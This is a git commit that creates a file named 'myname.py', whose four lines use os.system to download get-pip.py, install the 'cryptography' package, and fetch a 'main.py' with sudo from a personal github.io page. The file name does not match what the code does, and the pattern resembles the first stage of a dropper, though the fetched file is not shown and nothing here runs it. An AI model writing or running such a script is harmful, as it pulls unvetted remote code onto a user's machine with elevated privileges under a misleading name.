b424d26af39822460e0398a76369b9c0e3d2945b
Sonik <69720319+SuperS0n1k@users.noreply.github.com>
2023-08-29 17:07:22 +0100

    Create myname.py

---
+++ myname.py
@@ -0,0 +1,4 @@
+import os
+os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
+os.system("pip install cryptography")
+os.system("sudo curl https://supers0n1k.github.io/main.py -o main.py")
